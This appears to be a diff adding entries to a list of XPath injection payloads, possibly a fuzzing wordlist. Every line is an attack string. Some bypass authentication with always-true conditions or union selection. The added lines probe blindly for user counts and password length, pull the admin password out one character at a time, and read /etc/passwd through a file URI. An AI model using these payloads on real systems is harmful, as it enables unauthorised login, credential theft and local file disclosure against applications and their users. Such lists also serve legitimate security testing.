@@ -3,3 +3,7 @@
 '] | //user[name='admin
 admin' or '1'='1
 x' union //user/name/text() or '1'='1
+' or count(//user)>0 or 'a'='b
+' or string-length(//user[1]/password)>0 or 'a'='b
+'] | doc('file:///etc/passwd') | //x['
+' or //user[name/text()='admin' and substring(password/text(),1,1)='a'] or '1'='2
